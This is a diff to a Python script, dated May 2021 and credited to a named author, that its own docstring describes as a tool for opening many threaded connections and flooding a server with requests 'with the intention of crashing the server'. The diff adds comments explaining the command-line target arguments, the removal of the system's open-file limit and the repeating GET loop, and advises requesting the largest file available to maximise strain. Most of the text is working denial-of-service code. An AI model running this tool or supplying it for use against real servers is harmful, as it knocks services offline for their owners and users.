@@ -1,3 +1,14 @@
+#Author: Caden Corontzos
+#May 2021
+
+"""
+The goal of this program is to open a large number of connections and send a large number of requests, 
+with the intention of crashing the server. Each connection is opened as it's own thread. 
+
+"""
+
+
+
 from socket import *
 from _thread import *
 import threading
@@ -12,12 +23,20 @@ numThreads = 0
 #allows us to start more threads above what would be the normal limit for your system: basically it lets us do as much as your computer can handle
 resource.setrlimit(resource.RLIMIT_NOFILE, (resource.RLIM_INFINITY,resource.RLIM_INFINITY))
 
+#extrats cl arguments
 if len(sys.argv) == 4:
+
+    #IP of server
     serverName = sys.argv[1]
+    
+    #Port server is on
     serverPort = int(sys.argv[2])
+    
+    #How many connections we intend to open
     numConnections = int(sys.argv[3])
 else:
 
+    #If user didn't format arguments correctly, quit program
     print ("Please format as follows:\n\n " + sys.argv[0] + " < IP > < Port > < Number of Connections >\n")
     sys.exit(1)
 
@@ -32,11 +51,12 @@ def singleThread():
         #Establishes socket
         clientSocket.connect((serverName, serverPort))
             
-        #Asks for the filename that is being requested
+        #File we want to request.
+        #In a real situation, we would want to find the largest file/object we could on the server, the bigger the object the more strain on resources.
         req = 'test_data4.txt'
         clientSocket.send('GET '.encode() +req.encode())
         while True:
-            #Sends the request
+            #Continually sends the request every time interval
             time.sleep(.05)
             clientSocket.send('GET '.encode() +req.encode() +'\r\n\r\n'.encode())
 #
@@ -70,6 +90,8 @@ def singleThread():
 #
 #for thrd in attackThreads:
 #    thrd.join()
+
+#Opens the wanted number of connections
 while numThreads < numConnections:
     #print(str(numThreads))
     #starts a new single thread and then sleeps an appropriate ammt of time
